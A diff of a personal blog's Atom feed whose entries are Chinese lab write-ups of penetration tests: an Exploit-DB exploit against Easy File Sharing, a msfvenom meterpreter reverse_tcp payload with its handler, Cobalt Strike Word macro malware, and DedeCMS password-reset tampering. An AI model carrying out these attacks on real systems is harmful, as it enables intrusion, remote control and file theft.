@@ -12,7 +12,7 @@
     <category term="Web" />
     <entry>
         <id>http://meviv.github.io/2022/11/05/%E6%B8%97%E9%80%8F/rearch/</id>
-        <title>渗透复现任务A</title>
+        <title>渗透课程复现任务</title>
         <link rel="alternate" href="http://meviv.github.io/2022/11/05/%E6%B8%97%E9%80%8F/rearch/"/>
         <content type="html">&lt;p&gt;实验课复现内容&lt;/p&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
@@ -28,19 +28,19 @@
  (如遇无法 ping 通的情况，可关闭 winXP 的防火墙)&lt;/p&gt;
 &lt;h2 id=&#34;渗透过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#渗透过程&#34;&gt;#&lt;/a&gt; 渗透过程&lt;/h2&gt;
 &lt;p&gt;打开 kail 攻击机，扫描同一子网下主机&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp-scan -l&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmu7z7poj30k505dwfp.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp-scan -l&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/kyfeZWAcDClt7Og.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 对靶机进行进一步扫描，查看端口开放情况&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap -sV -A 192.168.232.132&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmub58p8j30ni0is43b.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap -sV -A 192.168.232.132&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/6dDt39hjCwLPJfl.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 知道了靶机开放端口服务&lt;br&gt;
 使用 searchsploit&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;searchsploit easy file sharing&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;searchsploit -m 39009&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmuf74hwj31bn0khjz7.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;searchsploit easy file sharing&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;searchsploit -m 39009&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/prgVy57shOe3oMY.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 运行脚本 python2+path+ip+port&lt;/p&gt;
 &lt;div class=&#34;note info&#34;&gt;
 &lt;p&gt;由于脚本输出没有使用严格括号，需要声明 py2 运行&lt;/p&gt;
 &lt;/div&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python2 &amp;#x2F;usr&amp;#x2F;share&amp;#x2F;exploitdb&amp;#x2F;exploits&amp;#x2F;windows&amp;#x2F;remote&amp;#x2F;39009.py 192.168.232.132 80&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7vmul45h6j30iw023dg1.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python2 &amp;#x2F;usr&amp;#x2F;share&amp;#x2F;exploitdb&amp;#x2F;exploits&amp;#x2F;windows&amp;#x2F;remote&amp;#x2F;39009.py 192.168.232.132 80&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/MyF89d2gtNxezKP.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 Done 表示脚本执行完成，打开靶机发现计算器已弹出&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmuohza7j309a09b3z6.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/a7M2eJcA9GjdtPu.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 至此完成渗透&lt;/p&gt;
 &lt;h1 id=&#34;metasploit应用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#metasploit应用&#34;&gt;#&lt;/a&gt; Metasploit 应用&lt;/h1&gt;
 &lt;p&gt;1、生成主控端、被控端。&lt;br&gt;
@@ -53,16 +53,16 @@ Done 表示脚本执行完成，打开靶机发现计算器已弹出&lt;br&gt;
 &lt;h2 id=&#34;渗透过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#渗透过程-2&#34;&gt;#&lt;/a&gt; 渗透过程&lt;/h2&gt;
 &lt;p&gt;生成被控端，在 kali 以 root 账户执行&lt;/p&gt;
 &lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom -p windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp lhost&amp;#x3D;192.168.232.130 lport&amp;#x3D;5000 -f exe -o &amp;#x2F;root&amp;#x2F;payload.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;生成 payload.exe 后传到靶机&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7vmura9z5j30om03tdgt.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/tjB1SODFIaJwbL4.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 生成主控端&lt;br&gt;
 再次以 root 账户执行&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfconsole&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit&amp;#x2F;multi&amp;#x2F;handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set payload windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set lhost 192.168.232.130&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set lport 5000&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7vmuyixy0j30oi0is43x.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfconsole&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit&amp;#x2F;multi&amp;#x2F;handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set payload windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set lhost 192.168.232.130&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set lport 5000&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/uJWlGteOmF1LRq2.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 此时，将生成的 payload.exe 程序复制到靶机上运行&lt;br&gt;
 成功获取权限&lt;br&gt;
 执行 ls 查看需要的文件。输入 dowload log.txt 下载文件&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7vmv0mr1rj30ha0ecwj3.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/GWOfaeihJVTzMd5.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 成功下载文件&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7vmv28ro7j30i00e7jry.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/oOlyiVNQ6uqEtsn.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 </content>
         <category term="Python" />
         <category term="渗透" />
@@ -72,7 +72,7 @@ Done 表示脚本执行完成，打开靶机发现计算器已弹出&lt;br&gt;
         <id>http://meviv.github.io/2022/09/18/%E6%B8%97%E9%80%8F/cobalt/</id>
         <title>CS实现宏病毒植入</title>
         <link rel="alternate" href="http://meviv.github.io/2022/09/18/%E6%B8%97%E9%80%8F/cobalt/"/>
-        <content type="html">&lt;p&gt;Cobalt&lt;/p&gt;
+        <content type="html">&lt;p&gt;CSGO…&lt;/p&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
 &lt;h1 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 环境搭建&lt;/h1&gt;
 &lt;p&gt;CS 分为服务端和客服端&lt;br&gt;
@@ -84,36 +84,36 @@ Done 表示脚本执行完成，打开靶机发现计算器已弹出&lt;br&gt;
 &lt;h1 id=&#34;渗透过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#渗透过程&#34;&gt;#&lt;/a&gt; 渗透过程&lt;/h1&gt;
 &lt;p&gt;在 kali 的 CS 路径下打开终端&lt;br&gt;
 运行： ./teamserver IP password&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;.&amp;#x2F;teamserver 192.168.232.130 695847&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7wjmfp0jsj30lp04wmy7.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;.&amp;#x2F;teamserver 192.168.232.130 695847&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/y6woz8HLK2BgYRq.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 打开客户端 CS，输入服务端 IP, 服务端端口，用户名 (随意)，密码&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7wjmhlxllj30d908w3zf.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/diIYeHanSBzKL9T.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 新建一个监听会话&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7wjmk1fimj30fr08mgm0.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7wjmlsik5j31hc0jo75n.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/6o5LXEi9zOZ8fWw.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/OnSgx2iVcIRXJd4.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 配置可自行调整&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7wjmom65bj30d30gnmyi.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/PYGJWwI6oX5Bmq4.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 创建完成后打开 payload, 选择 office 宏&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7wjmr1bvmj30f2071gmi.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/lSoTJwMUzpH5C1Z.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 选择刚刚创建的监听，复制病毒代码&lt;br&gt;
-&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h7wjmskkoqj309o04874l.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7wjrbuvr9j30dl08hgmv.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/sJDhfgaUC4tbL1x.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/yYFgRrBNq4C2Tfu.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 创建一个 word 文档&lt;/p&gt;
 &lt;div class=&#34;note info&#34;&gt;
 &lt;p&gt;如果电脑有杀毒软件，先创建信任区，需要在信任区内保存病毒文件&lt;/p&gt;
 &lt;/div&gt;
 &lt;p&gt;打开宏，创建宏，注意创建位置选择新建的文档&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7wjrdzfd0j30vs0d3gmj.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7wjs31idlj30cg0cxjrq.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/ynqE7Xb19uKzxRj.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/5dJVnLDgRrlExhz.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 将复制的恶意代码粘贴到新建的宏中，保存&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7wjs59ju8j31780jctez.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/B4xHEi9cvtrPQON.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 将恶意文件另存到信任区中，保存类型为启用宏的 word 文档&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7wjs7mfukj307301n3yg.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/Nm1RhrXbw8SdBZk.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 当靶机打开文件时，CS 显示目标已上线&lt;br&gt;
 打开监听会话操控靶机&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7wjsa1rh4j30sq0cuta3.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/EUNrKQloyTvJ2Fm.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 通过命令下载靶机目标文件，对靶机截图&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7wjscdzztj30mx053js8.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7wjsllou2j31b60j4jy4.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/ivxn1IJDHtqpja2.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/Z3svUTxVSbM6yp1.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 通过该会话可以进行更多渗透操作&lt;/p&gt;
 &lt;p&gt;End&lt;/p&gt;
 </content>
@@ -138,81 +138,6 @@ Done 表示脚本执行完成，打开靶机发现计算器已弹出&lt;br&gt;
 &lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker run -dit \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-v $PWD&amp;#x2F;ql2&amp;#x2F;config:&amp;#x2F;ql&amp;#x2F;config \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-v $PWD&amp;#x2F;ql2&amp;#x2F;log:&amp;#x2F;ql&amp;#x2F;log \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-v $PWD&amp;#x2F;ql2&amp;#x2F;scripts:&amp;#x2F;ql&amp;#x2F;scripts \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-v $PWD&amp;#x2F;ql2&amp;#x2F;db:&amp;#x2F;ql&amp;#x2F;db \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--name qinglong2 \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--hostname qinglong2 \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--restart always \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-p 5701:5700 \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;whyour&amp;#x2F;qinglong:latest&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
         <category term="Ubuntu" />
         <updated>2022-07-30T10:25:53.000Z</updated>
-    </entry>
-    <entry>
-        <id>http://meviv.github.io/2022/07/08/%E6%B8%97%E9%80%8F/dedecms02/</id>
-        <title>织梦系统渗透测试贰</title>
-        <link rel="alternate" href="http://meviv.github.io/2022/07/08/%E6%B8%97%E9%80%8F/dedecms02/"/>
-        <content type="html">&lt;p&gt;登录后台管理系统&lt;/p&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
-&lt;h1 id=&#34;工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h1&gt;
-&lt;p&gt;Burpsuite&lt;/p&gt;
-&lt;h1 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h1&gt;
-&lt;p&gt;前面登录管理员账户后，还没有成功登录网站后台，所以继续进行尝试&lt;br&gt;
-想要登录网站后台光靠 cookie 是不行的，得有正经的密码&lt;br&gt;
-原来的思路是修改密码时抓包&lt;br&gt;
-但是修改密码必须提供原密码，尝试几次后放弃了，还是尝试忘记密码重置&lt;br&gt;
-通过几次抓包都没有有用信息，Forward 后就返回了，&lt;br&gt;
-得设置个安全问题才能继续，最后用无安全问题进入重置&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h3zouozcfaj30r10b4gmx.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-抓包，发到 repeater&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h3zovqgw1nj31hc0u0gr0.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
- 修改 id=1,userid=admin,safequestion=0.0, 发包&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h3zoyhj47aj31hc0u0tho.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-得到一个网址，将 uploads 改为网站 ip&lt;br&gt;
-&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h3zp0e2yq3j30cp04v74d.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
- 访问失败，再次观察网址发现 get 请求有错，得把两个 amp; 删掉&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h3zp3klke8j30qr0aj75f.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h3zp413dpkj30ck04h74d.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-成功进入并且修改管理账号密码&lt;br&gt;
-吊诡的是虽然显示修改成功但实际上密码还是错误 (为此我反复抓包修改搞了两个多小时)&lt;br&gt;
- 最后发现退出 admin 后 cookie 就删了，得保持 admin 账号登录的情况下新建标签页重置密码&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h3zpvj0ytlj31hc0u0q95.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-再次抓包发到 repeater 并修改密码，修改后直接进入会员中心 - 系统设置&lt;br&gt;
-使用刚刚修改的密码重设&lt;br&gt;
-&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h3zq7pskmkj30qq0mq40p.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h3zq8gxr59j30cj04q0st.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-打开 dede，登录网站后台管理系统&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h3zqmlkh9dj30cm04omxa.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-成功进入网站后台&lt;/p&gt;
-</content>
-        <category term="渗透" />
-        <category term="Web" />
-        <updated>2022-07-08T04:34:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>http://meviv.github.io/2022/07/06/%E6%B8%97%E9%80%8F/dedecms01/</id>
-        <title>织梦系统渗透测试壹</title>
-        <link rel="alternate" href="http://meviv.github.io/2022/07/06/%E6%B8%97%E9%80%8F/dedecms01/"/>
-        <content type="html">&lt;p&gt;获得管理账户&lt;/p&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
-&lt;h2 id=&#34;工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h2&gt;
-&lt;p&gt;Burpsuite&lt;/p&gt;
-&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
-&lt;p&gt;开始注册了一个 ID 为 viv 的账号，在登录时想要通过抓包修改 userid 来实现越权&lt;br&gt;
-于是我修改了 userid 为 1，并且修改了 userid 的 md5 加密值&lt;br&gt;
-发包后直接返回了登录页面&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h3yn2hx5wxj31hc0u044w.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h3yn2u7qszj30ra0bodhb.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-就知道没这么简单&lt;br&gt;
-再次抓包，发现这个账号 userid 的 md5 值与 md5 的直接加密值不一样，猜测还有一次加密&lt;br&gt;
-尝试了 b64 和一些加密方式后再进行 md5，还是没法对应&lt;br&gt;
-这时发现访问个人空间时会基于 id 生成对应的 ckMd5 值，想到如果用户名为 1 时，就直接有了对应的 ckMd5 值了&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h3yn4319ckj30r205g0t6.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-于是注册一个用户名为 1 的账户&lt;br&gt;
